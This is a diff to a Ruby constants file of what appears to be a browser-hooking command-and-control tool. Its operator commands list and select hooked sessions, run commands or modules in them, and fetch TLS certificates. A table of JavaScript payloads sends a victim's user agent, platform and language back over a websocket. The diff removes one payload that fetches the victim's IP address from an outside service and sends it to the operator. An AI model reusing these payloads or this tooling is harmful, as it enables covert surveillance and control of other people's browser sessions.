@@ -19,7 +19,7 @@ module Constants
         "exit" => "Quit the application.",
         "sessions" => "List active sessions.",
         "target" => "Select or show targeted session.",
-        "info" => "Get session information (IP, User Agent, Operating System, Language, Path, Logged in user).",
+        "info" => "Get session information (User Agent, Operating System, Language, Path, Logged in user).",
         "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents (e.g. a module).",
         "get_cert" => "Get a free TLS certificate from LetsEncrypt.",
         "pry" => "Drop into a local Pry session.",
@@ -29,9 +29,6 @@ module Constants
         "modules" => "List all modules in modules directory. To execute a module enter exec MODULE_NAME."
     }.sort
     @infoCommands = {
-        "IP" => "var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() 
-        { if (xhttp.readyState == 4 && xhttp.status == 200) { ws.send(\"IP Address: \" + xhttp.responseText); }};
-        xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", true);xhttp.send();",
         "USER_AGENT" => "ws.send(\"User agent: \" + navigator.appVersion);",
         "OPERATING_SYSTEM" => "ws.send(\"OS: \" + navigator.platform);",
         "LANGUAGE" => "ws.send(\"Language: \" + navigator.language);",
